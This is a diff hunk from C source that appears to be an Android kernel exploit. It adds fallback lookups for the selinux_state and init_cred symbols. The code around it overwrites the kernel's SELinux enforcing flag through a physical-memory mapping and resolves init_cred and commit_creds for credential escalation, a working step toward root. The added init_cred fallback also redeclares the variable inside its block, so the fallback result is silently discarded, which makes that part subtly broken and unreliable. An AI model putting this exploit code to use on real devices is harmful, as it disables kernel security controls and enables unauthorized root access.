@@ -619,15 +619,23 @@ int main() {
         return 1;
     }
 
+    const bool force_manual_patchfinder = false;
+
     // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
     uint64_t kernel_virtual_base = kallsyms_lookup.kallsyms_relative_base;
     uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
+    if (force_manual_patchfinder || !kernel_selinux_state_addr) {
+        kernel_selinux_state_addr = cheese_lookup_selinux_state(&kallsyms_lookup);
+    }
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
     fprintf(stderr, "set selinux enforcing ptr...\n");
 
     uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
+    if (force_manual_patchfinder || !init_cred_addr) {
+        uint64_t init_cred_addr = cheese_lookup_init_cred(&kallsyms_lookup);
+    }
     uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");
 
 #define LO_DWORD(a) (a & 0xffffffff)
